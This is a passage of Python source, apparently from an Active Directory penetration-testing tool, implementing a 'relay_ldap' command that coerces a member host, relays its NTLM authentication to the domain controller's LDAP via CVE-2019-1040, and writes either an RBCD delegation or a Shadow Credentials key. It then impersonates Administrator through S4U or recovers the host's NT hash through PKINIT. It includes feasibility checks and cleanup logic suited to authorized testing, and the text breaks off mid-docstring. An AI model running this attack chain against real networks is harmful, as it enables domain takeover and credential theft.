"""Interactive LDAP-modify relay-attack verb (spec 2026-06-01, B.2 Stage 1b/2).

GLUE module. Composes primitives that already ship in ADscan into one operator
verb: coerce a single-homed member (e.g. WEB01), relay its NTLM authentication
to the DC's LDAP (drop-the-MIC / CVE-2019-1040), then write ONE of two
attributes on the victim and follow the matching post-exploitation tail:

* ``rbcd`` — write ``msDS-AllowedToActOnBehalfOfOtherIdentity`` granting a
  controlled delegate, then S4U2Self+Proxy as the delegate to mint a service
  ticket impersonating a privileged user on the victim.
* ``shadow-creds`` — append ``msDS-KeyCredentialLink`` (Shadow Credentials),
  then PKINIT with the minted key to recover the victim's NT hash. No delegate
  machine account is needed; requires a CA / NTAuth PKI (gated by feasibility).

No new offensive technique is implemented here — every building block exists:

* feasibility gate -> ``relay_feasibility.evaluate_relay_feasibility`` +
  ``relay_feasibility_panel.print_relay_feasibility_panel``
* delegate machine account (RBCD only) -> ``delegation_native.add_computer_native``
  (MAQ preflight via ``machine_account_provisioning_service``)
* coerce + relay orchestration -> ``relay.coerce.run_native_coerce_and_relay``
  with ``relay.ldap_modify.LDAPRBCDRelayTarget`` /
  ``relay.ldap_modify.LDAPShadowCredsRelayTarget`` (SELF target)
* RBCD post-ex -> ``delegation_native.run_s4u_get_st_native``
* shadow-creds post-ex (PKINIT->NT-hash) -> reused from
  ``adcs.shadow_credentials`` (the credentialed path's PKINIT tail)
* minted-identity UX -> ``exploitation.minted_account_identity`` (shared)
* cleanup -> ``environment_change_ledger``

Cleanup lifecycle (durable AD objects, NOT auto-revert):
  The verb registers its environment changes in the ledger BEFORE the action
  that makes them, so a FAILED run always leaves no mess. The delegate machine
  account, the RBCD grant and the KeyCredentialLink are durable AD objects, so
  they are tagged ``operator_confirmed`` in the ledger. The per-run cleanup
  reverts them ONLY on failure/abort. On SUCCESS the changes stay standing for
  the rest of the session (the operator can reuse the minted account), and the
  workspace-exit hook decides once whether to revert them (see
  :func:`run_operator_confirmed_exit_cleanup`; the decision itself lives in
  ``services.durable_change_policy``: non-interactive runs revert unless the
  operator explicitly chose to keep, interactive runs ask with "Revert all"
  preset). Every revert is confirmed by re-reading the object; one that cannot
  be confirmed is recorded ``manual_required`` with its DN. Cleanup restores the
  victim's prior attribute exactly (RBCD: prior security descriptor, or clears
  when originally empty; shadow-creds: the prior KeyCredentialLink list,
  removing only the entry we appended) and deletes any created delegate machine
  account, via a credentialed LDAP connection using our own shell credentials.
  A low-privilege MAQ creator that cannot delete the account falls back to
  disabling it (neutralized).

English-only. Every host / IP / account / SID / principal / hash is
``mark_sensitive``. All output is routed through ``print_*`` / ``get_console()``
(auto-mirrored to telemetry). Non-interactive runs auto-resolve every prompt to
a safe default and proceed only when feasibility is viable.
"""

from __future__ import annotations

from adscan_internal.services.ledger_guard import active_ledger, ledger_or_warn

import os
import shlex
from dataclasses import dataclass, field
from typing import Any, Mapping, Optional

from adscan_internal import telemetry
from adscan_internal.interaction import is_non_interactive
from adscan_internal.models.domain import (
    resolve_dc_ip,
    resolve_domain_controllers,
)
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_info,
    print_info_debug,
    print_success,
    print_warning,
)
from adscan_internal.services.environment_change_ledger import (
    CHANGE_CLASS_OPERATOR_CONFIRMED,
)
from adscan_internal.services.listener_ip import present_pending_callback_advice
from adscan_core.rich_output import print_exception

# Supported write methods (selector + feasibility key).
_METHOD_RBCD = "rbcd"
_METHOD_SHADOW = "shadow-creds"
_VALID_METHODS = (_METHOD_RBCD, _METHOD_SHADOW)

# Outcome codes returned by ``run_relay_ldap`` so the attack-path execution loop
# can mark the relay edge and decide whether to proceed to dependent steps
# (e.g. a Dump-LSA that assumes the relay compromised the target). ``None`` is
# returned on a precondition abort (missing victim/creds/listener) and is
# treated by the caller exactly like ``NOT_VIABLE`` (blocked, do not proceed).
RELAY_OUTCOME_SUCCESS = "success"
RELAY_OUTCOME_NOT_VIABLE = "not_viable"
RELAY_OUTCOME_FAILED = "failed"
#: Declined before writing: the policy allows no manual cleanup and the cleanup
#: account is not verified for this domain (nothing was changed).
RELAY_OUTCOME_NOT_PERMITTED = "not_permitted"


@dataclass(frozen=True)
class RelayRbcdArgs:
    """Parsed arguments for the ``relay_ldap`` / ``relay_rbcd`` verb.

    Attributes:
        victim: The single-homed member host to coerce + write on (IP or
            hostname/FQDN). Required.
        listener_ip: Override for the relay listener IP advertised to the
            victim. ``None`` -> derived from the shell ``myip`` / kernel route.
        socks5: Optional ``host:port`` SOCKS5 endpoint to pivot the coercion
            trigger through.
        actor_sid: SID of an already-controlled delegate machine account (RBCD
            only). When set, NO new account is minted; this SID is granted
            delegation. Ignored for the shadow-creds method.
        impersonate: User to impersonate in the RBCD S4U step (default
            ``Administrator``). Unused for shadow-creds.
        spn: Service SPN to request in the RBCD S4U step (default
            ``cifs/<victim-fqdn>``). Must be an FQDN-based SPN when set.
        domain: Explicit target domain. ``None`` -> inferred from shell context.
        method: Write method (``"rbcd"`` / ``"shadow-creds"``). ``None`` -> the
            verb prompts (non-interactive default ``rbcd``).
    """

    victim: Optional[str]
    listener_ip: Optional[str] = None
    socks5: Optional[str] = None
    actor_sid: Optional[str] = None
    impersonate: str = "Administrator"
    spn: Optional[str] = None
    domain: Optional[str] = None
    method: Optional[str] = None


def _looks_like_ip(value: str) -> bool:
    """Return True when *value* parses as an IPv4/IPv6 address."""
    import ipaddress  # noqa: PLC0415

    try:
        ipaddress.ip_address(str(value or "").strip())
        return True
    except ValueError:
        return False


def parse_relay_rbcd_args(args: str) -> RelayRbcdArgs:
    """Parse ``relay_ldap`` / ``relay_rbcd`` arguments.

    Form: ``relay_ldap <victim> [--method rbcd|shadow-creds] [--listener-ip IP]
    [--socks5 host:port] [--actor-sid SID] [--impersonate USER]
    [--spn service/host] [--domain DOM]``

    The first bare positional is the victim. Flags accept either ``--flag value``
    or ``--flag=value``.

    Args:
        args: Raw argument string passed to the REPL verb.

    Returns:
        A :class:`RelayRbcdArgs`. ``victim`` is ``None`` when no positional was
        supplied (the caller renders usage). ``method`` is normalized to a valid
        value or ``None`` (prompt) when absent/unrecognised.
    """
    try:
        tokens = shlex.split(args or "")
    except ValueError:
        tokens = (args or "").split()

    victim: Optional[str] = None

    _flag_names = (
        ("method", "method"),
        ("listener-ip", "listener_ip"),
        ("socks5", "socks5"),
        ("actor-sid", "actor_sid"),
        ("impersonate", "impersonate"),
        ("spn", "spn"),
        ("domain", "domain"),
    )

    parsed: dict[str, Optional[str]] = {}
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok.startswith("--"):
            matched = False
            for name, key in _flag_names:
                if tok == f"--{name}":
                    if i + 1 < len(tokens):
                        parsed[key] = tokens[i + 1]
                        i += 1
                    matched = True
                    break
                if tok.startswith(f"--{name}="):
                    parsed[key] = tok.split("=", 1)[1]
                    matched = True
                    break
            if not matched:
                print_info_debug(f"[relay-ldap] ignoring unknown flag: {tok}")
        elif victim is None:
            victim = tok
        i += 1

    method = (parsed.get("method") or "").strip().lower() or None
    if method is not None and method not in _VALID_METHODS:
        print_info_debug(f"[relay-ldap] unrecognised --method {method!r}; will prompt")
        method = None

    return RelayRbcdArgs(
        victim=victim,
        listener_ip=parsed.get("listener_ip"),
        socks5=parsed.get("socks5"),
        actor_sid=parsed.get("actor_sid"),
        impersonate=parsed.get("impersonate") or "Administrator",
        spn=parsed.get("spn"),
        domain=parsed.get("domain"),
        method=method,
    )


def _infer_context_domain(shell: Any) -> Optional[str]:
    """Infer the target domain from shell context.

    Prefers the shell's current ``domain``; falls back to the sole known domain
    when ``domains_data`` is unambiguous.
    """
    current = str(getattr(shell, "domain", "") or "").strip()
    domains_data = getattr(shell, "domains_data", {}) or {}
    if current and current in domains_data:
        return current
    if isinstance(domains_data, dict) and len(domains_data) == 1:
        return next(iter(domains_data))
    return current or None


def _victim_ip_for_listener(
    shell: Any, *, victim: Optional[str], domain: str, dc_ip: str
) -> str:
    """Return the IP of the coerced victim, the host that must call back.

    The advertised listener has to be reachable from the VICTIM's segment, not
    the DC's. An IP victim is used as-is; a hostname is resolved best-effort
    (no operator prompt, no foreign-DC discovery) and only falls back to the
    domain's DC when it cannot be resolved.
    """
    target = str(victim or "").strip()
    if target and _looks_like_ip(target):
        return target
    if target:
        try:
            from adscan_internal.services.host_address_resolver import (  # noqa: PLC0415
                resolve_host_address,
            )

            resolved = resolve_host_address(
                shell,
                host=target,
                domain=domain,
                resolver_ip=dc_ip,
                allow_operator_prompt=False,
                allow_foreign_dc_discovery=False,
            )
            if resolved.resolved_ip:
                return str(resolved.resolved_ip)
        except Exception as exc:  # noqa: BLE001 - best-effort, fall back to the DC
            print_info_debug(f"[relay-rbcd] victim address resolution failed: {exc}")
    return dc_ip


def _resolve_listener_ip(
    shell: Any, target_ip: str, override: Optional[str]
) -> Optional[str]:
    """Resolve the relay listener IP advertised to the victim.

    Delegates to the per-target SSOT ladder (override, declared ``myip``, kernel
    route toward ``target_ip``, interface ``myip``). Returns ``None`` when
    nothing usable can be found.
    """
    from adscan_internal.services.listener_ip import (  # noqa: PLC0415
        resolve_listener_ip,
    )

    selection = resolve_listener_ip(shell, target=target_ip, override=override)
    print_info_debug(
        f"relay-rbcd listener ip: source={selection.source} "
        f"ip={mark_sensitive(str(selection.ip or 'none'), 'ip')} "
        f"target={mark_sensitive(selection.target, 'ip')} reason={selection.reason}"
    )
    return selection.ip


def _ntlm_auth_verdict_from_workspace(
    shell: Any, domain: str, *, victim_ip: Optional[str] = None
) -> Any:
    """Build the ``NtlmAuthVerdict`` feasibility input from persisted probe data.

    The NTLMv1 / drop-the-MIC requirement applies to the **coerced victim** — the
    host whose NTLM authentication is captured and relayed to the DC's LDAP — NOT
    to the relay TARGET (the DC). The DC's own auth-type is irrelevant here; the
    DC-side constraints that matter (LDAP signing, channel binding, LDAPS) are
    evaluated by separate checks. So read the **victim's** per-host classification
    from ``ntlm_auth_type_by_host[victim_ip]`` (populated by the NTLM auth-type
    sweep) first.

    A coerced member that authenticates with NTLMv1 (e.g. WEB01$) is relayable to
    LDAP without CVE-2019-1040, even when the DC itself speaks NTLMv2 — which is
    exactly the post-pivot RBCD path. Reading the domain-level ``dc_ntlm_auth_type``
    instead (the historical bug) reported "NTLMv2 observed" for an NTLMv1 victim
    and wrongly blocked the relay as NO-GO.

    Fall back to the domain-level ``dc_ntlm_auth_type`` only when no per-host
    verdict exists for the victim (victim unknown / unclassified, or the legacy
    coerce-the-DC scenario). When neither yields a definitive NTLMv1/NTLMv2, the
    verdict is conservative (both ``None``) — the feasibility framework treats
    that as "not probed -> blocking" and tells the operator to classify first.
    """
    from adscan_internal.services.relay.relay_feasibility import (  # noqa: PLC0415
        NtlmAuthVerdict,
    )

    domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}

    auth_type = ""
    source = ""
    vip = str(victim_ip or "").strip()
    if vip:
        by_host = domain_data.get("ntlm_auth_type_by_host") or {}
        entry = by_host.get(vip)
        if isinstance(entry, dict):
            candidate = str(entry.get("ntlm_auth_type") or "").strip()
            if candidate in ("NTLMv1", "NTLMv2"):
                auth_type = candidate
                source = f"victim {vip}"

    if not auth_type:
        # No definitive per-host verdict for the victim — fall back to the
        # domain-level DC classification (legacy / coerce-the-DC path).
        auth_type = str(domain_data.get("dc_ntlm_auth_type") or "").strip()
        if auth_type in ("NTLMv1", "NTLMv2"):
            source = "DC"

    if auth_type == "NTLMv1":
        return NtlmAuthVerdict(
            ntlmv1_observed=True, detail=f"NTLMv1 observed ({source})"
        )
    if auth_type == "NTLMv2":
        return NtlmAuthVerdict(
            ntlmv1_observed=False,
            dc_cve_2019_1040_vulnerable=None,
            detail=f"NTLMv2 observed ({source}); DC CVE-2019-1040 status unknown",
        )
    return None


def _adcs_pki_present_from_workspace(shell: Any, domain: str) -> Optional[bool]:
    """Best-effort read of whether a CA/NTAuth PKI is present for the domain.

    Reads any persisted ADCS enumeration result; returns ``None`` (unknown) when
    nothing is recorded. RBCD does not require PKI, so an unknown here is a
    warning for RBCD; for shadow-creds the feasibility framework treats an
    explicit ``False`` as blocking (and ``None`` as a caveat).
    """
    domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
    adcs = domain_data.get("adcs") or domain_data.get("certipy") or {}
    if isinstance(adcs, dict) and adcs:
        cas = adcs.get("certificate_authorities") or adcs.get("cas") or adcs.get("ca")
        if cas:
            return True
    return None


def _get_workspace_dir(shell: Any) -> str:
    """Return the workspace dir for ledger/ccache output (cwd fallback)."""
    return str(getattr(shell, "current_workspace_dir", "") or "").strip() or os.getcwd()


def _shell_domain_creds(shell: Any, domain: str) -> tuple[str, str]:
    """Return ``(username, secret)`` from the shell's domain context."""
    domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
    username = str(domain_data.get("username") or "").strip()
    secret = str(domain_data.get("password") or "").strip()
    return username, secret


def _looks_like_nt_hash(secret: str) -> bool:
    return bool(
        secret
        and len(secret) == 32
        and all(c in "0123456789abcdefABCDEF" for c in secret)
    )


@dataclass
class _PlannedDelegate:
    """The delegate principal granted RBCD on the victim.

    Either a freshly minted machine account (``created=True``) or an existing
    controlled account passed via ``--actor-sid`` (``created=False``).
    """

    sid: str
    sam: Optional[str] = None  # includes trailing $ for a minted account
    password: Optional[str] = None
    dn: Optional[str] = None
    created: bool = False
    ledger_change_id: Optional[str] = None


@dataclass
class _RbcdLedgerState:
    """Tracks the reversible changes for guaranteed cleanup (both methods).

    For RBCD: an optional delegate account + the RBCD attribute. For
    shadow-creds: the ``msDS-KeyCredentialLink`` change (no delegate). The
    method-specific fields are populated only for the active method.
    """

    delegate: Optional[_PlannedDelegate] = None
    # RBCD
    rbcd_change_id: Optional[str] = None
    rbcd_target_dn: Optional[str] = None
    rbcd_prior_sd_hex: Optional[str] = None
    rbcd_prior_empty: bool = False
    # Shadow credentials
    shadow_change_id: Optional[str] = None
    shadow_target_dn: Optional[str] = None
    shadow_prior_values: Optional[list[str]] = None
    extra: dict[str, Any] = field(default_factory=dict)


def _select_method(shell: Any, parsed: RelayRbcdArgs, *, adcs_pki_present: Optional[bool]) -> Optional[str]:
    """Resolve the write method: explicit ``--method``, else a gated selector.

    ``shadow-creds`` is offered only when ``adcs_pki_present`` is truthy — a
    KeyCredentialLink is useless without a CA/NTAuth chain to PKINIT against. The
    selector is centralized (non-interactive safe; default ``rbcd``).

    Returns the chosen method, or ``None`` when the operator selected an
    impossible/cancelled option (caller aborts).
    """
    if parsed.method in _VALID_METHODS:
        if parsed.method == _METHOD_SHADOW and adcs_pki_present is False:
            print_error(
                "--method shadow-creds requires a CA / NTAuth PKI, but none was "
                "found for this domain. Use --method rbcd instead."
            )
            return None
        return parsed.method

    from adscan_core.output import questionary_select_index  # noqa: PLC0415

    shadow_enabled = bool(adcs_pki_present)
    rbcd_label = "RBCD — write msDS-AllowedToActOnBehalfOfOtherIdentity + S4U"
    if shadow_enabled:
        shadow_label = "Shadow Credentials — write msDS-KeyCredentialLink + PKINIT->NT hash"
    else:
        shadow_label = (
            "Shadow Credentials — [unavailable: no CA / NTAuth PKI detected]"
        )
    options = [rbcd_label, shadow_label]
    idx = questionary_select_index(
        title="Select the LDAP-modify relay method",
        options=options,
        default_idx=0,  # safe default: RBCD (always viable when relay is viable)
        shell=shell,
    )
    if idx is None:
        print_warning("No method selected — aborting.")
        return None
    if idx == 1:
        if not shadow_enabled:
            print_error(
                "Shadow Credentials is unavailable (no CA / NTAuth PKI detected). "
                "Re-run with --method rbcd."
            )
            return None
        return _METHOD_SHADOW
    return _METHOD_RBCD


def run_relay_rbcd(shell: Any, args: str) -> None:
    """[DEPRECATED] Alias for :func:`run_relay_ldap` forcing the RBCD method.

    Kept for backward compatibility with the ``relay_rbcd`` REPL verb. New code
    should call :func:`run_relay_ldap` and let the operator pick the method.
    """
    run_relay_ldap(shell, args, forced_method=_METHOD_RBCD)


def run_relay_ldap(
    shell: Any, args: str, *, forced_method: Optional[str] = None
) -> Optional[str]:
    """Entry point for the ``relay_ldap`` REPL verb (RBCD / shadow-creds).

    Orchestrates the full chain. The per-run cleanup reverts the durable changes
    ONLY on failure/abort; on success they are KEPT (the operator retains the
    access and can reuse the minted account) and the workspace-exit hook later
    prompts whether to revert them. See the module docstring for the
    composition map and cleanup lifecycle.

    Args:
        shell: The active :class:`PentestShell` (provides domains_data, creds,
            myip, workspace dir, and the environment-change ledger).
        args: Raw argument string from the REPL.
        forced_method: When set (the deprecated ``relay_rbcd`` alias), pins the
            method and skips the selector.
    """
    parsed = parse_relay_rbcd_args(args)
    if not parsed.victim:
        print_error(
            "Usage: relay_ldap <victim-ip> [--method rbcd|shadow-creds] "
            "[--listener-ip IP] [--socks5 host:port] [--actor-sid SID] "
            "[--impersonate USER] [--spn service/host] [--domain DOMAIN]"
        )
        return

    domain = parsed.domain or _infer_context_domain(shell)
    if not domain:
        print_error(
            "Could not infer a target domain. Provide it explicitly: "
            "relay_ldap <victim-ip> --domain <domain>."
        )
        return

    domains_data = getattr(shell, "domains_data", {}) or {}
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        print_error(f"Domain not found in current context: {mark_sensitive(domain, 'domain')}")
        return

    dc_ip = resolve_dc_ip(domain_data)
    if not dc_ip:
        print_error(
            f"No DC/KDC IP resolved for {mark_sensitive(domain, 'domain')}. "
            "Ensure Phase 1 / DNS discovery populated the PDC."
        )
        return

    username, secret = _shell_domain_creds(shell, domain)
    if not username or not secret:
        print_error(
            "This attack requires authenticated domain credentials in the current "
            "domain context (used to mint/clean up and to revert the target)."
        )
        return

    listener_ip = _resolve_listener_ip(
        shell,
        _victim_ip_for_listener(
            shell, victim=parsed.victim, domain=domain, dc_ip=dc_ip
        ),
        parsed.listener_ip,
    )
    if not listener_ip:
        print_error(
            "Could not resolve a relay listener IP. Set 'myip' or pass --listener-ip."
        )
        return

    # --- 1. Method selection (gated on ADCS for shadow-creds) --------------- #
    adcs_pki_present = _adcs_pki_present_from_workspace(shell, domain)
    method = forced_method or _select_method(shell, parsed, adcs_pki_present=adcs_pki_present)
    if method is None:
        return

    # The relayed computer writes these attributes on itself and its identity is
    # gone when they are reverted, so only the client's cleanup account (or a
    # verified privileged credential) can undo them. Under a policy that allows
    # no manual cleanup the chain runs only once that account is verified here.
    from adscan_internal.services.revert_permission import (  # noqa: PLC0415
        cleanup_write_permitted,
    )

    relay_kinds = (
        ("keycredentiallink_added",)
        if method == _METHOD_SHADOW
        else ("machine_account_created", "rbcd_delegation_added")
    )
    if not cleanup_write_permitted(
        shell, domain=domain, kinds=relay_kinds, surface="relay_ldap", target=parsed.victim or ""
    ):
        return RELAY_OUTCOME_NOT_PERMITTED

    # --- 2. Feasibility gate ------------------------------------------------ #
    feasibility = _evaluate_feasibility(
        shell,
        domain=domain,
        dc_ip=dc_ip,
        username=username,
        secret=secret,
        method=method,
        adcs_pki_present=adcs_pki_present,
        use_existing_actor=bool(parsed.actor_sid),
        victim_ip=parsed.victim,
    )
    if not _confirm_proceed_after_feasibility(shell, feasibility, method=method):
        return RELAY_OUTCOME_NOT_VIABLE

    ledger = ledger_or_warn(shell)
    state = _RbcdLedgerState()

    # Success flag — gates per-run cleanup. The chain sets it True only when the
    # full chain landed. On any exception / early return it stays False, so the
    # finally-block reverts the partial durable changes (leaving no mess on a
    # failed run). On success the durable changes are KEPT for the operator.
    success = {"ok": False}

    try:
        if method == _METHOD_SHADOW:
            _run_chain_shadow(
                shell,
                parsed=parsed,
                domain=domain,
                dc_ip=dc_ip,
                username=username,
                secret=secret,
                listener_ip=listener_ip,
                ledger=ledger,
                state=state,
                success=success,
            )
        else:
            _run_chain(
                shell,
                parsed=parsed,
                domain=domain,
                dc_ip=dc_ip,
                username=username,
                secret=secret,
                listener_ip=listener_ip,
                ledger=ledger,
                state=state,
                success=success,
            )
    except Exception as exc:  # noqa: BLE001 - report + still clean up
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        success["ok"] = False
        print_error(f"relay_ldap chain failed: {exc}")
    finally:
        # Per-run cleanup reverts ONLY on failure/abort. On success the durable
        # operator_confirmed changes are KEPT (the operator retains the access);
        # the workspace-exit hook prompts whether to revert them later.
        _cleanup(
            shell,
            domain=domain,
            dc_ip=dc_ip,
            username=username,
            secret=secret,
            ledger=ledger,
            state=state,
            succeeded=bool(success["ok"]),
        )

    return RELAY_OUTCOME_SUCCESS if success["ok"] else RELAY_OUTCOME_FAILED


def _alternate_dc_available(
    domains_data: Mapping[str, Any], domain: str, *, coerce_host: Optional[str]
) -> Optional[bool]:
    """Return whether a DC PROVABLY distinct from ``coerce_host`` exists.

    Used by the self-relay reflection backstop: when the coerced host is the sole
    DC there is no non-reflecting relay target. Delegates to the DC-topology SSOT
    (:func:`resolve_domain_controllers`), which builds ONE record per distinct DC
    carrying all of its aliases (IP + short + FQDN), so a coerced host that is the
    sole DC's IP still matches that DC via its FQDN alias and is NOT counted as an
    alternate of itself (the essos single-DC false positive).

    Returns ``True`` only when a provably-different DC machine exists; ``False``
    when the coerced host IS the sole DC; ``None`` when the coerce host is unknown
    or no DC identifiers are recorded. A false "no alternate" harmlessly blocks a
    real multi-DC relay; a false "alternate available" lets a doomed self-relay
    proceed — so the conservative direction is the correct one for a backstop.
    """
    coerce = str(coerce_host or "").strip()
    if not coerce:
        return None
    dd = (domains_data or {}).get(domain) or {}
    return resolve_domain_controllers(dd).has_alternate_dc(coerce)


def _evaluate_feasibility(
    shell: Any,
    *,
    domain: str,
    dc_ip: str,
    username: str,
    secret: str,
    method: str = _METHOD_RBCD,
    adcs_pki_present: Optional[bool] = None,
    use_existing_actor: bool,
    victim_ip: Optional[str] = None,
) -> Any:
    """Build feasibility inputs, evaluate, render the panel, and return it.

    ``victim_ip`` is the coerced host whose NTLM auth is relayed; it drives the
    NTLMv1/drop-the-MIC verdict (the victim's per-host auth-type, NOT the DC's).
    """
    from adscan_internal.services.relay.relay_feasibility import (  # noqa: PLC0415
        RelayFeasibilityInputs,
        evaluate_relay_feasibility,
    )
    from adscan_internal.services.relay.relay_feasibility_panel import (  # noqa: PLC0415
        print_relay_feasibility_panel,
    )

    # The feasibility framework keys shadow-creds as "shadow_creds".
    feas_method = "shadow_creds" if method == _METHOD_SHADOW else "rbcd"

    # MAQ only matters for the RBCD create-new-delegate branch.
    maq = None
    if method == _METHOD_RBCD and not use_existing_actor:
        maq = _assess_maq(shell, domain=domain, dc_ip=dc_ip, username=username, secret=secret)

    if adcs_pki_present is None:
        adcs_pki_present = _adcs_pki_present_from_workspace(shell, domain)

    inputs = RelayFeasibilityInputs(
        domains_data=getattr(shell, "domains_data", {}) or {},
        domain=domain,
        dc_host=dc_ip,
        method=feas_method,
        ntlm_auth=_ntlm_auth_verdict_from_workspace(shell, domain, victim_ip=victim_ip),
        adcs_pki_present=adcs_pki_present,
        machine_account_quota=maq,
        # The actual reverse-route probe is a separate capability (spec D1);
        # leaving this None surfaces it as a caveat in the panel rather than
        # asserting an unverified reachability.
        listener_reachable_from_victim=None,
        relayed_principal_self_write=None,
        # Self-relay reflection backstop: the coerced host is ``victim_ip``; the
        # LDAP relay target for RBCD/Shadow-Creds is the DC (``dc_ip``). If they
        # are the same machine and no OTHER DC exists, the relay reflects to
        # itself and can never land — refuse it BEFORE minting a delegate.
        coerce_host=victim_ip,
        relay_target_host=dc_ip,
        alternate_dc_available=_alternate_dc_available(
            getattr(shell, "domains_data", {}) or {}, domain, coerce_host=victim_ip
        ),
    )
    feasibility = evaluate_relay_feasibility(inputs)
    print_relay_feasibility_panel(
        feasibility, domain=domain, dc_host=dc_ip, method=feas_method
    )
    return feasibility


def _assess_maq(
    shell: Any, *, domain: str, dc_ip: str, username: str, secret: str
) -> Optional[int]:
    """MAQ preflight for the create-new-delegate branch.

    Returns the ACTOR's remaining capacity (domain quota minus the computer
    objects whose ``mS-DS-CreatorSID`` is the actor), falling back to the domain
    quota when the actor's count could not be read. The domain value alone said
    "ok" for an actor that had already used every slot (MAQ investigation 3.2).
    """
    try:
        from adscan_internal.services.domain_posture import get_posture  # noqa: PLC0415
        from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
            ADscanLDAPConfig,
        )
        from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
            assess_machine_account_capacity,
        )

        ldap_config = ADscanLDAPConfig(
            domain=domain,
            dc_ip=dc_ip,
            use_ldaps=True,
            use_kerberos=False,
            username=username,
            password=secret,
            posture_snapshot=get_posture(getattr(shell, "domains_data", {}) or {}, domain=domain),
        )
        capacity = assess_machine_account_capacity(
            ldap_config=ldap_config, actor_username=username, shell=shell
        )
        if capacity.remaining is not None:
            return capacity.remaining
        return capacity.domain_quota
    except Exception as exc:  # noqa: BLE001 - preflight is best-effort
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_info_debug(f"[relay-ldap] MAQ preflight failed: {exc}")
        return None


def _confirm_proceed_after_feasibility(
    shell: Any, feasibility: Any, *, method: str = _METHOD_RBCD
) -> bool:
    """Abort cleanly when not viable; otherwise confirm (auto-yes when viable, non-interactive)."""
    if not feasibility.viable:
        print_error(
            "Relay not viable — aborting before standing up any listener. "
            "See the feasibility panel above for the blocking constraint."
        )
        return False

    from adscan_core.output import confirm_ask  # noqa: PLC0415

    if is_non_interactive(shell):
        # Non-interactive: proceed only because feasibility is viable (the gate).
        return True
    label = (
        "Shadow-Credentials" if method == _METHOD_SHADOW else "RBCD"
    )
    chain = (
        "coerce + relay + PKINIT"
        if method == _METHOD_SHADOW
        else "coerce + relay + S4U"
    )
    return bool(
        confirm_ask(
            f"Proceed with the {label} relay chain ({chain})?",
            default=True,
        )
    )


def _run_chain(
    shell: Any,
    *,
    parsed: RelayRbcdArgs,
    domain: str,
    dc_ip: str,
    username: str,
    secret: str,
    listener_ip: str,
    ledger: Any,
    state: _RbcdLedgerState,
    success: dict[str, bool],
) -> None:
    """RBCD chain: delegate-create -> coerce+relay -> S4U. Records ledger changes.

    Sets ``success["ok"] = True`` once the RBCD attribute has landed (the durable
    change exists from this point) so the per-run cleanup keeps it.
    """
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415

    # 3. Delegate account (create unless --actor-sid given).
    delegate = _provision_delegate(
        shell,
        parsed=parsed,
        domain=domain,
        dc_ip=dc_ip,
        username=username,
        secret=secret,
        ledger=ledger,
    )
    if delegate is None:
        return
    state.delegate = delegate

    _print_chain_preflight(
        victim=parsed.victim or "",
        dc_ip=dc_ip,
        listener_ip=listener_ip,
        delegate=delegate,
    )

    # 4. Coerce + relay -> write RBCD on the victim (SELF target).
    relay_outcome = run_async_sync(
        _coerce_relay_rbcd(
            shell=shell,
            victim=parsed.victim or "",
            dc_ip=dc_ip,
            domain=domain,
            username=username,
            secret=secret,
            listener_ip=listener_ip,
            delegate_sid=delegate.sid,
            socks5=parsed.socks5,
        )
    )
    # Safe point: the coerce-and-relay loop has finished, so "no callback arrived"
    # guidance (which may prompt) is shown here, not from inside the coroutine.
    present_pending_callback_advice(shell)
    # Teardown trace: if this marker prints, the coerce-and-relay (including the
    # listener shutdown) returned and any freeze is downstream (ledger / S4U); if
    # it does NOT print but the run_native_relay teardown markers do, the hang is
    # inside the relay-source listener stop (stray half-open coerced connections).
    print_info_debug("relay-teardown coerce-and-relay returned to RBCD chain; processing result")
    rbcd_result = _first_relay_result(relay_outcome)
    if rbcd_result is None or not rbcd_result.success:
        err = rbcd_result.error if rbcd_result else "no authentication captured"
        print_warning(
            f"RBCD relay did not land: {err}. "
            "Verify the listener IP is reachable from the victim and that the "
            "victim authenticated with NTLMv1 / the DC is CVE-2019-1040 vulnerable."
        )
        return

    meta = dict(rbcd_result.metadata or {})
    state.rbcd_target_dn = meta.get("target_dn")
    state.rbcd_prior_sd_hex = meta.get("prior_sd_hex")
    state.rbcd_prior_empty = bool(meta.get("prior_attribute_empty"))
    # Register the RBCD attribute change immediately so cleanup restores it.
    # Durable AD grant -> operator_confirmed (kept on success, reverted on
    # failure or by operator prompt at exit). The prior security descriptor is
    # persisted in the ledger detail so the exit reverter is self-contained.
    if ledger is not None and not meta.get("already_set"):
        try:
            state.rbcd_change_id = ledger.register_change(
                kind="rbcd_delegation_added",
                domain=domain,
                target=str(meta.get("target_computer") or parsed.victim or ""),
                detail={
                    "target_dn": state.rbcd_target_dn,
                    "actor_sid": delegate.sid,
                    "prior_attribute_empty": state.rbcd_prior_empty,
                    "prior_sd_hex": state.rbcd_prior_sd_hex,
                    "prior_sd_hex_present": bool(
                        state.rbcd_prior_sd_hex
                        and state.rbcd_prior_sd_hex != "empty"
                    ),
                },
                method="relay_ldap_rbcd_self",
                change_class=CHANGE_CLASS_OPERATOR_CONFIRMED,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)

    # The durable RBCD grant has landed: a SUCCESS from here keeps it.
    success["ok"] = True

    # 5. S4U with the delegate's creds (only meaningful for a minted account
    #    whose password we hold; for --actor-sid we have only the SID).
    ccache_path = _run_s4u(
        shell,
        parsed=parsed,
        domain=domain,
        dc_ip=dc_ip,
        delegate=delegate,
    )

    # 6. Premium result panel.
    _print_result_panel(
        victim=parsed.victim or "",
        dc_ip=dc_ip,
        delegate=delegate,
        impersonate=parsed.impersonate,
        ccache_path=ccache_path,
        already_set=bool(meta.get("already_set")),
    )


def _run_chain_shadow(
    shell: Any,
    *,
    parsed: RelayRbcdArgs,
    domain: str,
    dc_ip: str,
    username: str,
    secret: str,
    listener_ip: str,
    ledger: Any,
    state: _RbcdLedgerState,
    success: dict[str, bool],
) -> None:
    """Shadow-creds chain: coerce+relay -> append KeyCredentialLink -> PKINIT->NT.

    No delegate machine account is provisioned (the difference from RBCD). The
